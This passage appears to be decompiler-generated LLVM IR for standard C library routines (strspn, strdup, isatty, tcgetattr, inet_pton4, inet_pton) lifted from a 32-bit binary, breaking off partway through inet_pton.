define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_804d0e230 = load i8, i8* %arg1, align 1
  %v4_804d0e434 = icmp eq i8 %v2_804d0e230, 0
  br i1 %v4_804d0e434, label %dec_label_pc_804d0ec, label %dec_label_pc_804d0e8.lr.ph

dec_label_pc_804d0e8.lr.ph:                       ; preds = %entry
  %v3_804d0e231 = zext i8 %v2_804d0e230 to i32
  %v4_804d0e2.pre = load i32, i32* @eax, align 4
  %v5_804d0e232 = and i32 %v4_804d0e2.pre, -256
  %v6_804d0e233 = or i32 %v3_804d0e231, %v5_804d0e232
  %v4_804d0c9 = ptrtoint i8* %arg1 to i32
  %v1_804d0d418 = inttoptr i32 %arg2 to i8*
  %v4_804d0d4.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804d0e8

dec_label_pc_804d0cf:                             ; preds = %dec_label_pc_804d0e8, %dec_label_pc_804d0d3
  %v6_804d0d427 = phi i32 [ %v6_804d0d4, %dec_label_pc_804d0d3 ], [ %v6_804d0d422, %dec_label_pc_804d0e8 ]
  %v2_804d0d426 = phi i8 [ %v2_804d0d4, %dec_label_pc_804d0d3 ], [ %v2_804d0d419, %dec_label_pc_804d0e8 ]
  %v0_804d0d325 = phi i32 [ %v1_804d0d3, %dec_label_pc_804d0d3 ], [ %arg2, %dec_label_pc_804d0e8 ]
  %v15_804d0cf = icmp eq i8 %v2_804d0e237, %v2_804d0d426
  br i1 %v15_804d0cf, label %dec_label_pc_804d0dc, label %dec_label_pc_804d0d3

dec_label_pc_804d0d3:                             ; preds = %dec_label_pc_804d0cf
  %v1_804d0d3 = add i32 %v0_804d0d325, 1
  store i32 %v1_804d0d3, i32* @edx, align 4
  %v1_804d0d4 = inttoptr i32 %v1_804d0d3 to i8*
  %v2_804d0d4 = load i8, i8* %v1_804d0d4, align 1
  %v3_804d0d4 = zext i8 %v2_804d0d4 to i32
  %v5_804d0d4 = and i32 %v6_804d0d427, -256
  %v6_804d0d4 = or i32 %v3_804d0d4, %v5_804d0d4
  store i32 %v6_804d0d4, i32* @ecx, align 4
  %v4_804d0d6 = icmp eq i8 %v2_804d0d4, 0
  %v1_804d0d8 = icmp eq i1 %v4_804d0d6, false
  br i1 %v1_804d0d8, label %dec_label_pc_804d0cf, label %dec_label_pc_804d0ec

dec_label_pc_804d0dc:                             ; preds = %dec_label_pc_804d0cf
  %v1_804d0e0 = add i32 %v0_804d0ec35, 1
  %v1_804d0e1 = add i32 %v0_804d0e136, 1
  %v1_804d0e2 = inttoptr i32 %v1_804d0e1 to i8*
  %v2_804d0e2 = load i8, i8* %v1_804d0e2, align 1
  %v3_804d0e2 = zext i8 %v2_804d0e2 to i32
  %v5_804d0e2 = and i32 %v6_804d0e238, -256
  %v6_804d0e2 = or i32 %v3_804d0e2, %v5_804d0e2
  %v4_804d0e4 = icmp eq i8 %v2_804d0e2, 0
  br i1 %v4_804d0e4, label %dec_label_pc_804d0ec, label %dec_label_pc_804d0e8

dec_label_pc_804d0e8:                             ; preds = %dec_label_pc_804d0e8.lr.ph, %dec_label_pc_804d0dc
  %v4_804d0d4.pre = phi i32 [ %v4_804d0d4.pre.pre, %dec_label_pc_804d0e8.lr.ph ], [ %v6_804d0d427, %dec_label_pc_804d0dc ]
  %v6_804d0e238 = phi i32 [ %v6_804d0e233, %dec_label_pc_804d0e8.lr.ph ], [ %v6_804d0e2, %dec_label_pc_804d0dc ]
  %v2_804d0e237 = phi i8 [ %v2_804d0e230, %dec_label_pc_804d0e8.lr.ph ], [ %v2_804d0e2, %dec_label_pc_804d0dc ]
  %v0_804d0e136 = phi i32 [ %v4_804d0c9, %dec_label_pc_804d0e8.lr.ph ], [ %v1_804d0e1, %dec_label_pc_804d0dc ]
  %v0_804d0ec35 = phi i32 [ 0, %dec_label_pc_804d0e8.lr.ph ], [ %v1_804d0e0, %dec_label_pc_804d0dc ]
  store i32 %arg2, i32* @edx, align 4
  %v2_804d0d419 = load i8, i8* %v1_804d0d418, align 1
  %v3_804d0d420 = zext i8 %v2_804d0d419 to i32
  %v5_804d0d421 = and i32 %v4_804d0d4.pre, -256
  %v6_804d0d422 = or i32 %v3_804d0d420, %v5_804d0d421
  store i32 %v6_804d0d422, i32* @ecx, align 4
  %v4_804d0d623 = icmp eq i8 %v2_804d0d419, 0
  %v1_804d0d824 = icmp eq i1 %v4_804d0d623, false
  br i1 %v1_804d0d824, label %dec_label_pc_804d0cf, label %dec_label_pc_804d0ec

dec_label_pc_804d0ec:                             ; preds = %entry, %dec_label_pc_804d0dc, %dec_label_pc_804d0e8, %dec_label_pc_804d0d3
  %v0_804d0ec17 = phi i32 [ %v0_804d0ec35, %dec_label_pc_804d0d3 ], [ %v0_804d0ec35, %dec_label_pc_804d0e8 ], [ 0, %entry ], [ %v1_804d0e0, %dec_label_pc_804d0dc ]
  ret i32 %v0_804d0ec17

; uselistorder directives
  uselistorder i32 %v6_804d0d422, { 1, 0 }
  uselistorder i8 %v2_804d0d419, { 1, 2, 0 }
  uselistorder i32 %v1_804d0e1, { 1, 0 }
  uselistorder i32 %v6_804d0d4, { 1, 0 }
  uselistorder i8 %v2_804d0d4, { 1, 2, 0 }
  uselistorder i32 %v1_804d0d3, { 2, 1, 0 }
  uselistorder i8 %v2_804d0e230, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d0ec, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_804d0e8, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804d0f4 = load i32, i32* @edi, align 4
  %v0_804d0f5 = load i32, i32* @esi, align 4
  %v0_804d0f6 = load i32, i32* @ebx, align 4
  store i32 %v0_804d0f6, i32* %stack_var_-12, align 4
  %v4_804d0f7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804d0f7, i32* @edi, align 4
  %v3_804d0ff = call i32 @strlen(i8* %arg1)
  %v1_804d104 = add i32 %v3_804d0ff, 1
  store i32 %v1_804d104, i32* @esi, align 4
  %v2_804d10a = call i32 @malloc(i32 %v1_804d104)
  store i32 %v2_804d10a, i32* %ebx.global-to-local, align 4
  %v1_804d114 = icmp eq i32 %v2_804d10a, 0
  br i1 %v1_804d114, label %dec_label_pc_804d124, label %dec_label_pc_804d118

dec_label_pc_804d118:                             ; preds = %entry
  %v0_804d119 = load i32, i32* @esi, align 4
  %v0_804d11a = load i32, i32* @edi, align 4
  %tmp10 = inttoptr i32 %v2_804d10a to i16*
  %v6_804d11c = call i32 @memcpy(i16* %tmp10, i32 %v0_804d11a, i32 %v0_804d119)
  %v0_804d124.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d124

dec_label_pc_804d124:                             ; preds = %entry, %dec_label_pc_804d118
  %v0_804d124 = phi i32 [ 0, %entry ], [ %v0_804d124.pre, %dec_label_pc_804d118 ]
  %v2_804d126 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d126, i32* @ebx, align 4
  store i32 %v0_804d0f5, i32* @esi, align 4
  store i32 %v0_804d0f4, i32* @edi, align 4
  ret i32 %v0_804d124

; uselistorder directives
  uselistorder i32 %v2_804d10a, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 6, 5, 4, 3, 2, 1, 8, 7, 0 }
  uselistorder label %dec_label_pc_804d124, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_804d138 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_804d13d = icmp eq i32 %v3_804d138, 0
  %v1_804d13f = zext i1 %v1_804d13d to i32
  ret i32 %v1_804d13f
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d14c = load i32, i32* @esi, align 4
  %v0_804d14d = load i32, i32* @ebx, align 4
  store i32 %v0_804d14d, i32* %stack_var_-8, align 4
  %v2_804d151 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804d151, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_804d163 = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_804d151)
  store i32 %v3_804d163, i32* %eax.global-to-local, align 4
  store i32 %v3_804d163, i32* @esi, align 4
  %v1_804d16d = icmp eq i32 %v3_804d163, 0
  %v1_804d16f = icmp eq i1 %v1_804d16d, false
  br i1 %v1_804d16f, label %dec_label_pc_804d1b4, label %dec_label_pc_804d171

dec_label_pc_804d171:                             ; preds = %entry
  %v3_804d171 = load i32, i32* %stack_var_-44, align 4
  %v1_804d175 = load i32, i32* @ebx, align 4
  %v2_804d175 = inttoptr i32 %v1_804d175 to i32*
  store i32 %v3_804d171, i32* %v2_804d175, align 4
  %v1_804d17b = load i32, i32* @ebx, align 4
  %v2_804d17b = add i32 %v1_804d17b, 4
  %v3_804d17b = inttoptr i32 %v2_804d17b to i32*
  %v1_804d182 = load i32, i32* @ebx, align 4
  %v2_804d182 = add i32 %v1_804d182, 8
  %v3_804d182 = inttoptr i32 %v2_804d182 to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_804d189 = load i32, i32* @ebx, align 4
  %v2_804d189 = add i32 %v1_804d189, 12
  %v3_804d189 = inttoptr i32 %v2_804d189 to i32*
  store i32 %tmp3, i32* %v3_804d189, align 4
  %v4_804d18c = zext i8 %tmp to i32
  %v5_804d18c = load i32, i32* %eax.global-to-local, align 4
  %v6_804d18c = and i32 %v5_804d18c, -256
  %v7_804d18c = or i32 %v6_804d18c, %v4_804d18c
  store i32 %v7_804d18c, i32* %eax.global-to-local, align 4
  %v2_804d190 = load i32, i32* @ebx, align 4
  %v3_804d190 = add i32 %v2_804d190, 16
  %v4_804d190 = inttoptr i32 %v3_804d190 to i8*
  store i8 %tmp, i8* %v4_804d190, align 1
  %v0_804d193 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d196 = ptrtoint i32* %stack_var_-27 to i32
  %v0_804d19b = load i32, i32* @ebx, align 4
  %v1_804d19b = add i32 %v0_804d19b, 17
  store i32 %v1_804d19b, i32* %eax.global-to-local, align 4
  %v4_804d19f = call i32 @__GI_mempcpy(i32 %v1_804d19b, i32 %v2_804d196, i32 19, i32 %v0_804d193)
  store i32 %v4_804d19f, i32* %eax.global-to-local, align 4
  %v3_804d1ac = inttoptr i32 %v4_804d19f to i8*
  %v4_804d1ac = call i32 @__GI_memset(i8* %v3_804d1ac, i32 0, i32 13)
  store i32 %v4_804d1ac, i32* %eax.global-to-local, align 4
  %v0_804d1b4.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804d1b4

dec_label_pc_804d1b4:                             ; preds = %entry, %dec_label_pc_804d171
  %v0_804d1b4 = phi i32 [ %v3_804d163, %entry ], [ %v0_804d1b4.pre, %dec_label_pc_804d171 ]
  store i32 %v0_804d1b4, i32* %eax.global-to-local, align 4
  %v2_804d1b9 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d1b9, i32* @ebx, align 4
  store i32 %v0_804d14c, i32* @esi, align 4
  ret i32 %v0_804d1b4

; uselistorder directives
  uselistorder i32 %v0_804d1b4, { 1, 0 }
  uselistorder i32 %v3_804d163, { 0, 2, 1, 3 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 13, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d1b4, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_804d1be = load i32, i32* @esi, align 4
  %v0_804d1c5 = load i32, i32* @eax, align 4
  store i32 %v0_804d1c5, i32* %ebx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  store i32 0, i32* @edi, align 4
  %v2_804d1cb = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804d1cb, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_804d21315 = inttoptr i32 %v0_804d1c5 to i8*
  %v2_804d21316 = load i8, i8* %v1_804d21315, align 1
  %v3_804d21317 = sext i8 %v2_804d21316 to i32
  store i32 %v3_804d21317, i32* @ecx, align 4
  %v1_804d21618 = add i32 %v0_804d1c5, 1
  store i32 %v1_804d21618, i32* %ebx.global-to-local, align 4
  %v1_804d21719 = icmp eq i8 %v2_804d21316, 0
  %v1_804d21920 = icmp eq i1 %v1_804d21719, false
  br i1 %v1_804d21920, label %dec_label_pc_804d1d6, label %dec_label_pc_804d21b.thread

dec_label_pc_804d21b.thread:                      ; preds = %entry
  br label %dec_label_pc_804d238

dec_label_pc_804d1d6:                             ; preds = %entry, %dec_label_pc_804d213.backedge
  %v3_804d21322 = phi i32 [ %v3_804d213, %dec_label_pc_804d213.backedge ], [ %v3_804d21317, %entry ]
  %v2_804d21321 = phi i8 [ %v2_804d213, %dec_label_pc_804d213.backedge ], [ %v2_804d21316, %entry ]
  %v1_804d1d6 = add nsw i32 %v3_804d21322, -48
  store i32 %v1_804d1d6, i32* %eax.global-to-local, align 4
  %v6_804d1dc = icmp ugt i32 %v1_804d1d6, 9
  br i1 %v6_804d1dc, label %dec_label_pc_804d1ff, label %dec_label_pc_804d1de

dec_label_pc_804d1de:                             ; preds = %dec_label_pc_804d1d6
  %v0_804d1de = load i32, i32* @esi, align 4
  %v1_804d1de = inttoptr i32 %v0_804d1de to i8*
  %v2_804d1de = load i8, i8* %v1_804d1de, align 1
  %v2_804d1e1 = zext i8 %v2_804d1de to i32
  %v3_804d1e1 = mul nuw nsw i32 %v2_804d1e1, 10
  %v3_804d1e4 = add nsw i32 %v3_804d1e1, %v1_804d1d6
  store i32 %v3_804d1e4, i32* %eax.global-to-local, align 4
  %v6_804d1ed = icmp ugt i32 %v3_804d1e4, 255
  br i1 %v6_804d1ed, label %dec_label_pc_804d238, label %dec_label_pc_804d1ef

dec_label_pc_804d1ef:                             ; preds = %dec_label_pc_804d1de
  %v1_804d1ef = trunc i32 %v3_804d1e4 to i8
  store i8 %v1_804d1ef, i8* %v1_804d1de, align 1
  %v0_804d1f1 = load i32, i32* @edx, align 4
  %v1_804d1f1 = icmp eq i32 %v0_804d1f1, 0
  %v1_804d1f3 = icmp eq i1 %v1_804d1f1, false
  br i1 %v1_804d1f3, label %dec_label_pc_804d213.backedge, label %dec_label_pc_804d1f5

dec_label_pc_804d1f5:                             ; preds = %dec_label_pc_804d1ef
  %v0_804d1f5 = load i32, i32* @edi, align 4
  %v1_804d1f5 = add i32 %v0_804d1f5, 1
  store i32 %v1_804d1f5, i32* @edi, align 4
  %v1_804d1f6 = add i32 %v0_804d1f5, -3
  %v6_804d1f6 = sub i32 2, %v0_804d1f5
  %v7_804d1f6 = and i32 %v6_804d1f6, %v1_804d1f5
  %v8_804d1f6 = icmp slt i32 %v7_804d1f6, 0
  %v9_804d1f6 = icmp eq i32 %v1_804d1f6, 0
  %v10_804d1f6 = icmp slt i32 %v1_804d1f6, 0
  %v3_804d1f9 = icmp eq i1 %v10_804d1f6, %v8_804d1f6
  %v4_804d1f9 = icmp eq i1 %v9_804d1f6, false
  %v5_804d1f9 = and i1 %v4_804d1f9, %v3_804d1f9
  br i1 %v5_804d1f9, label %dec_label_pc_804d238, label %dec_label_pc_804d1fb

dec_label_pc_804d1fb:                             ; preds = %dec_label_pc_804d1f5
  %v1_804d1fb = and i32 %v0_804d1f1, -256
  %v2_804d1fb = or i32 %v1_804d1fb, 1
  store i32 %v2_804d1fb, i32* @edx, align 4
  br label %dec_label_pc_804d213.backedge

dec_label_pc_804d1ff:                             ; preds = %dec_label_pc_804d1d6
  %v9_804d1ff = icmp eq i8 %v2_804d21321, 46
  %v1_804d202 = icmp eq i1 %v9_804d1ff, false
  br i1 %v1_804d202, label %dec_label_pc_804d238, label %dec_label_pc_804d204

dec_label_pc_804d204:                             ; preds = %dec_label_pc_804d1ff
  %v0_804d204 = load i32, i32* @edx, align 4
  %v1_804d204 = icmp eq i32 %v0_804d204, 0
  br i1 %v1_804d204, label %dec_label_pc_804d238, label %dec_label_pc_804d208

dec_label_pc_804d208:                             ; preds = %dec_label_pc_804d204
  %v0_804d208 = load i32, i32* @edi, align 4
  %v9_804d208 = icmp eq i32 %v0_804d208, 4
  br i1 %v9_804d208, label %dec_label_pc_804d238, label %dec_label_pc_804d20d

dec_label_pc_804d20d:                             ; preds = %dec_label_pc_804d208
  %v0_804d20d = load i32, i32* @esi, align 4
  %v1_804d20d = add i32 %v0_804d20d, 1
  store i32 %v1_804d20d, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v1_804d210 = inttoptr i32 %v1_804d20d to i8*
  store i8 0, i8* %v1_804d210, align 1
  br label %dec_label_pc_804d213.backedge

dec_label_pc_804d213.backedge:                    ; preds = %dec_label_pc_804d20d, %dec_label_pc_804d1fb, %dec_label_pc_804d1ef
  %v0_804d213.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d213 = inttoptr i32 %v0_804d213.pre to i8*
  %v2_804d213 = load i8, i8* %v1_804d213, align 1
  %v3_804d213 = sext i8 %v2_804d213 to i32
  store i32 %v3_804d213, i32* @ecx, align 4
  %v1_804d216 = add i32 %v0_804d213.pre, 1
  store i32 %v1_804d216, i32* %ebx.global-to-local, align 4
  %v1_804d217 = icmp eq i8 %v2_804d213, 0
  %v1_804d219 = icmp eq i1 %v1_804d217, false
  br i1 %v1_804d219, label %dec_label_pc_804d1d6, label %dec_label_pc_804d21b

dec_label_pc_804d21b:                             ; preds = %dec_label_pc_804d213.backedge
  %v0_804d21b.pre = load i32, i32* @edi, align 4
  %v7_804d21e = icmp sgt i32 %v0_804d21b.pre, 3
  br i1 %v7_804d21e, label %dec_label_pc_804d220, label %dec_label_pc_804d238

dec_label_pc_804d220:                             ; preds = %dec_label_pc_804d21b
  %v0_804d220 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_804d1cb, i32* %eax.global-to-local, align 4
  %v3_804d229 = bitcast i32* %stack_var_-20 to i16*
  %v4_804d229 = call i32 @memcpy(i16* %v3_804d229, i32 4, i32 %v0_804d220)
  br label %dec_label_pc_804d23a

dec_label_pc_804d238:                             ; preds = %dec_label_pc_804d208, %dec_label_pc_804d204, %dec_label_pc_804d1ff, %dec_label_pc_804d1f5, %dec_label_pc_804d1de, %dec_label_pc_804d21b.thread, %dec_label_pc_804d21b
  br label %dec_label_pc_804d23a

dec_label_pc_804d23a:                             ; preds = %dec_label_pc_804d220, %dec_label_pc_804d238
  %storemerge = phi i32 [ 0, %dec_label_pc_804d238 ], [ 1, %dec_label_pc_804d220 ]
  %v0_804d241 = phi i32 [ 0, %dec_label_pc_804d238 ], [ 1, %dec_label_pc_804d220 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804d1be, i32* @esi, align 4
  ret i32 %v0_804d241

; uselistorder directives
  uselistorder i32 %v3_804d213, { 1, 0 }
  uselistorder i8 %v2_804d213, { 1, 2, 0 }
  uselistorder i32 %v1_804d1f6, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 255, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_804d23a, { 1, 0 }
  uselistorder label %dec_label_pc_804d238, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804d1d6, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804d242 = load i32, i32* @ebp, align 4
  %v0_804d243 = load i32, i32* @edi, align 4
  %v0_804d244 = load i32, i32* @esi, align 4
  %v0_804d245 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_804d24d = ptrtoint i8* %arg2 to i32
  store i32 %v4_804d24d, i32* @edi, align 4
  %v9_804d251 = icmp eq i32 %arg1, 2
  br i1 %v9_804d251, label %dec_label_pc_804d261, label %dec_label_pc_804d256

dec_label_pc_804d256:                             ; preds = %entry
  %v9_804d256 = icmp eq i32 %arg1, 10
  %v1_804d259 = icmp eq i1 %v9_804d256, false
  br i1 %v1_804d259, label %dec_label_pc_804d3f2, label %dec_label_pc_804d271

dec_label_pc_804d261:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_804d24d, i32* @eax, align 4
  %v3_804d267 = call i32 @inet_pton4(i32 %v0_804d245, i32 %v0_804d244, i32 %v0_804d243)
  store i32 %v3_804d267, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d404

dec_label_pc_804d271:                             ; preds = %dec_label_pc_804d256
  %v2_804d276 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804d276, i32* %eax.global-to-local, align 4
  %tmp60 = bitcast i32* %stack_var_-32 to i8*
  %v5_804d27b = call i32 @__GI_memset(i8* %tmp60, i32 0, i32 16)
  store i32 %v5_804d27b, i32* @ebx, align 4
  %v2_804d282 = add i32 %v5_804d27b, 16
  store i32 %v2_804d282, i32* %eax.global-to-local, align 4
  %v0_804d28c = load i32, i32* @edi, align 4
  %v1_804d28c = inttoptr i32 %v0_804d28c to i8*
  %v2_804d28c = load i8, i8* %v1_804d28c, align 1
  %v11_804d28c = icmp eq i8 %v2_804d28c, 58
  %v1_804d28f = icmp eq i1 %v11_804d28c, false
  br i1 %v1_804d28f, label %dec_label_pc_804d322, label %dec_label_pc_804d291

dec_label_pc_804d291:                             ; preds = %dec_label_pc_804d271
  %v1_804d291 = add i32 %v0_804d28c, 1
  store i32 %v1_804d291, i32* @edi, align 4
  %v1_804d292 = inttoptr i32 %v1_804d291 to i8*
  %v2_804d292 = load i8, i8* %v1_804d292, align 1
  %v11_804d292 = icmp eq i8 %v2_804d292, 58
  %v1_804d295 = icmp eq i1 %v11_804d292, false
  br i1 %v1_804d295, label %dec_label_pc_804d402, label %dec_label_pc_804d322

dec_label_pc_804d2a9:                             ; preds = %dec_label_pc_804d362
  %v4_804d2b1 = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805063c.107, i32 0, i32 0), i32 %v2_804d369)
  store i32 %v4_804d2b1, i32* %eax.global-to-local, align 4
  %v0_804d2b6 = load i32, i32* @edi, align 4
  %v1_804d2b6 = add i32 %v0_804d2b6, 1
  store i32 %v1_804d2b6, i32* @edi, align 4
  %v1_804d2ba = icmp eq i32 %v4_804d2b1, 0
  br i1 %v1_804d2ba, label %dec_label_pc_804d2d9, label %dec_label_pc_804d2be

dec_label_pc_804d2be:                             ; preds = %dec_label_pc_804d2a9
  %v0_804d2be = load i32, i32* @ebp, align 4
  %v2_804d2be = mul i32 %v0_804d2be, 16
  %v1_804d2c1 = add i32 %v4_804d2b1, -134547004
  store i32 %v1_804d2c1, i32* %eax.global-to-local, align 4
  %v2_804d2c6 = or i32 %v2_804d2be, %v1_804d2c1
  store i32 %v2_804d2c6, i32* @ebp, align 4
  %tmp126 = icmp ult i32 %v2_804d2c6, 65536
  br i1 %tmp126, label %dec_label_pc_804d362.outer, label %dec_label_pc_804d402

dec_label_pc_804d362.outer:                       ; preds = %dec_label_pc_804d2be, %dec_label_pc_804d322
  %v0_804d36536 = phi i32 [ %v1_804d2b6, %dec_label_pc_804d2be ], [ %stack_var_-36.0.in, %dec_label_pc_804d322 ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_804d2be ], [ %stack_var_-44.0, %dec_label_pc_804d322 ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_804d2be ], [ %stack_var_-36.0, %dec_label_pc_804d322 ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_804d2be ], [ 0, %dec_label_pc_804d322 ]
  %v4_804d2de = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_804d2e3 = icmp eq i1 %v4_804d2de, false
  br label %dec_label_pc_804d362

dec_label_pc_804d2d9:                             ; preds = %dec_label_pc_804d2a9
  %v0_804d2d9 = load i32, i32* @esi, align 4
  %v9_804d2d9 = icmp eq i32 %v0_804d2d9, 58
  %v1_804d2dc = icmp eq i1 %v9_804d2d9, false
  br i1 %v1_804d2dc, label %dec_label_pc_804d32e, label %dec_label_pc_804d2de

dec_label_pc_804d2de:                             ; preds = %dec_label_pc_804d2d9
  br i1 %v1_804d2e3, label %dec_label_pc_804d2fa, label %dec_label_pc_804d2e5

dec_label_pc_804d2e5:                             ; preds = %dec_label_pc_804d2de
  %v5_804d2e5 = icmp eq i8* %stack_var_-44.1, null
  %v1_804d2ea = icmp eq i1 %v5_804d2e5, false
  br i1 %v1_804d2ea, label %dec_label_pc_804d402, label %dec_label_pc_804d2f0

dec_label_pc_804d2f0:                             ; preds = %dec_label_pc_804d2e5
  %v0_804d2f0 = load i32, i32* @ebx, align 4
  %v5_804d2f0 = inttoptr i32 %v0_804d2f0 to i8*
  %v5_804d2f4 = inttoptr i32 %v1_804d2b6 to i8*
  br label %dec_label_pc_804d362

dec_label_pc_804d2fa:                             ; preds = %dec_label_pc_804d2de
  %v1_804d2fa = inttoptr i32 %v1_804d2b6 to i8*
  %v2_804d2fa = load i8, i8* %v1_804d2fa, align 1
  %v3_804d2fa = icmp eq i8 %v2_804d2fa, 0
  br i1 %v3_804d2fa, label %dec_label_pc_804d402, label %dec_label_pc_804d303

dec_label_pc_804d303:                             ; preds = %dec_label_pc_804d2fa
  %v0_804d303 = load i32, i32* @ebx, align 4
  %v1_804d303 = add i32 %v0_804d303, 2
  store i32 %v1_804d303, i32* @edx, align 4
  %v6_804d30a = icmp ugt i32 %v1_804d303, %v2_804d282
  br i1 %v6_804d30a, label %dec_label_pc_804d402, label %dec_label_pc_804d310

dec_label_pc_804d310:                             ; preds = %dec_label_pc_804d303
  %v0_804d310 = load i32, i32* @ebp, align 4
  %v2_804d312 = udiv i32 %v0_804d310, 256
  %v4_804d312 = trunc i32 %v2_804d312 to i8
  %v3_804d315 = inttoptr i32 %v0_804d303 to i8*
  store i8 %v4_804d312, i8* %v3_804d315, align 1
  %v0_804d317 = load i32, i32* @ebp, align 4
  store i32 %v0_804d317, i32* %eax.global-to-local, align 4
  %v1_804d319 = trunc i32 %v0_804d317 to i8
  %v2_804d319 = load i32, i32* @ebx, align 4
  %v3_804d319 = add i32 %v2_804d319, 1
  %v4_804d319 = inttoptr i32 %v3_804d319 to i8*
  store i8 %v1_804d319, i8* %v4_804d319, align 1
  %v0_804d31c = load i32, i32* @edx, align 4
  store i32 %v0_804d31c, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d322

dec_label_pc_804d322:                             ; preds = %dec_label_pc_804d271, %dec_label_pc_804d291, %dec_label_pc_804d310
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_804d310 ], [ %v1_804d291, %dec_label_pc_804d291 ], [ %v0_804d28c, %dec_label_pc_804d271 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_804d310 ], [ null, %dec_label_pc_804d291 ], [ null, %dec_label_pc_804d271 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804d362.outer

dec_label_pc_804d32e:                             ; preds = %dec_label_pc_804d2d9
  %v9_804d32e = icmp eq i32 %v0_804d2d9, 46
  %v1_804d331 = icmp eq i1 %v9_804d32e, false
  br i1 %v1_804d331, label %dec_label_pc_804d402, label %dec_label_pc_804d337

dec_label_pc_804d337:                             ; preds = %dec_label_pc_804d32e
  %v0_804d337 = load i32, i32* @ebx, align 4
  %v1_804d337 = add i32 %v0_804d337, 4
  store i32 %v1_804d337, i32* @esi, align 4
  %v6_804d33e = icmp ugt i32 %v1_804d337, %v2_804d282
  br i1 %v6_804d33e, label %dec_label_pc_804d402, label %dec_label_pc_804d344

dec_label_pc_804d344:                             ; preds = %dec_label_pc_804d337
  store i32 %v0_804d337, i32* @edx, align 4
  %v4_804d346 = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_804d346, i32* @eax, align 4
  %v2_804d34a = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_804d34a = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_804d34a, i32 %v2_804d282)
  store i32 %v5_804d34a, i32* %eax.global-to-local, align 4
  %v0_804d34f = load i32, i32* @esi, align 4
  %tmp61 = icmp slt i32 %v5_804d34a, 1
  %tmp62 = icmp eq i1 %tmp61, false
  br i1 %tmp62, label %dec_label_pc_804d399, label %dec_label_pc_804d402

dec_label_pc_804d362:                             ; preds = %dec_label_pc_804d362.outer, %dec_label_pc_804d2f0
